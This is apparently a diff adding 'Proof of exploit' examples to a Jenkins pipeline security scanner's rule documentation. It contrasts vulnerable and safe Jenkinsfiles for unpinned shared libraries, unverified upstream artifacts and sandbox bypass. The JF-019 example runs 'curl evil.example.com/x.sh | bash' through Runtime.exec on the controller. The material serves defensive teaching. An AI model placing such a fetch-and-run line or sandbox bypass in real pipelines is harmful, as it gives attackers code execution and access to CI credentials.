@@ -7485,6 +7485,47 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Recommendation.** Pin every `@Library('name@<ref>')` to a release tag (e.g. `@v1.4.2`) or a 40-char commit SHA. Configure the library in Jenkins with 'Allow default version to be overridden' disabled so a pipeline can't escape the pin.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: every build resolves @main against the
+// shared-library repo. A push to main (legitimate update
+// from a teammate, a credential leak, a compromised
+// maintainer account) is silently picked up on the next
+// pipeline run with the build's full credential set in
+// scope (CI_JOB_TOKEN-equivalent, Jenkins credentials,
+// agent secrets).
+@Library('build-utils@main') _
+
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        deployToProd()  // sourced from the shared library
+      }
+    }
+  }
+}
+
+// Safe: pin to a release tag (or 40-char commit SHA) and
+// disable 'Allow default version to be overridden' on the
+// library config in Jenkins so a pipeline can't escape
+// the pin by re-declaring the @Library line.
+@Library('build-utils@v1.4.2') _
+
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        deployToProd()
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-001`](../providers/jenkins.md#jf-001) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-002`: Script step interpolates attacker-controllable env var <span class="pg-sev pg-sev--high">HIGH</span> { #detail-jf-002 }
@@ -7617,6 +7658,54 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 
 **Recommendation.** Add a verification step before consuming the artifact: `sh 'sha256sum -c manifest.sha256'` against a manifest the producer signed, or `cosign verify` over the artifact directly. Restrict the upstream job to non-PR builds via branch protection if verification isn't feasible.
 
+**Proof of exploit.**
+
+```
+// Vulnerable: ``app-build`` is a multibranch job that runs
+// on every PR branch. A contributor opens a PR, the PR
+// build produces a malicious ``release.jar`` as its
+// artifact, and ``deploy`` copies and runs that jar inside
+// the controller's credential context. The deploy job
+// has no way to know the upstream artifact came from an
+// untrusted ref.
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        copyArtifacts(
+          projectName: 'app-build',
+          filter: 'release.jar',
+          selector: lastSuccessful()
+        )
+        sh 'java -jar release.jar'
+      }
+    }
+  }
+}
+
+// Safe: verify a producer-signed manifest before executing
+// anything from the copied directory. The verify step must
+// come BEFORE any step that reads the artifact.
+pipeline {
+  agent any
+  stages {
+    stage('deploy') {
+      steps {
+        copyArtifacts(
+          projectName: 'app-build',
+          filter: 'release.jar,release.jar.sig,manifest.sha256',
+          selector: lastSuccessful()
+        )
+        sh 'sha256sum -c manifest.sha256'
+        sh 'cosign verify-blob --signature release.jar.sig release.jar'
+        sh 'java -jar release.jar'
+      }
+    }
+  }
+}
+```
+
 **Source:** [`JF-013`](../providers/jenkins.md#jf-013) in the [Jenkins provider](../providers/jenkins.md).
 
 ### `JF-014`: Agent label missing ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-jf-014 }
@@ -7692,6 +7781,50 @@ resource "aws_iam_role_policy" "codebuild_least_priv" {
 **How this is detected.** Detects Groovy patterns that bypass the Jenkins script security sandbox: `Runtime.getRuntime()`, `Class.forName()`, `.classLoader`, `ProcessBuilder`, and `@Grab`. These give the pipeline (or an attacker who controls its source) unrestricted access to the Jenkins controller JVM, full RCE.
 
 **Recommendation.** Remove direct Runtime/ClassLoader calls. Use Jenkins pipeline steps instead. Avoid @Grab for untrusted dependencies.
+
+**Proof of exploit.**
+
+```
+// Vulnerable: ``Runtime.getRuntime().exec(...)`` bypasses
+// the script-security sandbox and runs arbitrary commands
+// in the Jenkins controller's JVM. The controller has
+// access to every credential, every agent SSH key, every
+// configured cloud provider token — full Jenkins takeover
+// from one ``Jenkinsfile`` edit. ``@Grab`` is the same
+// vector for pulling an arbitrary Maven dependency that
+// runs as the controller.
+pipeline {
+  agent any
+  stages {
+    stage('debug') {
+      steps {
+        script {
+          def proc = Runtime.getRuntime().exec(
+            ['bash', '-c', 'curl evil.example.com/x.sh | bash']
+          )
+          proc.waitFor()
+        }
+      }
+    }
+  }
+}
+
+// Safe: use Jenkins pipeline steps for everything; they
+// run through the script-security sandbox. ``sh`` runs on
+// the agent (not the controller), so even if the body is
+// malicious, the blast radius is one agent, not the whole
+// Jenkins installation.
+pipeline {
+  agent any
+  stages {
+    stage('debug') {
+      steps {
+        sh 'env'
+      }
+    }
+  }
+}
+```
 
 **Source:** [`JF-019`](../providers/jenkins.md#jf-019) in the [Jenkins provider](../providers/jenkins.md).
 
